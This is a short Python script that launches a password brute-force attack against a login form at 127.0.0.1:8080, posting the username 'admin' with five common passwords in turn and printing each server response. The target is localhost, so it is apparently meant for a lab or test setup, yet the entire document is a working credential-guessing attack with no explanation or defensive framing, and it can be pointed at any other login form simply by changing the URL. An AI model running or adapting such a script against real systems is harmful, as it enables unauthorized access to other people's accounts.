import urllib.request
import urllib.parse
import time

url = "http://127.0.0.1:8080/"
passwords = ["123456", "password", "admin123", "letmein", "Secret123"]

print("🔥 Launching password brute-force attack...")
for pwd in passwords:
    data = urllib.parse.urlencode({'username': 'admin', 'password': pwd}).encode('utf-8')
    try:
        req = urllib.request.Request(url, data=data, method='POST')
        with urllib.request.urlopen(req) as response:
            print(response.read().decode())
    except urllib.error.HTTPError as e:
        print(f"Attempt with password '{pwd}': Access Denied ({e.code})")
    time.sleep(0.5)
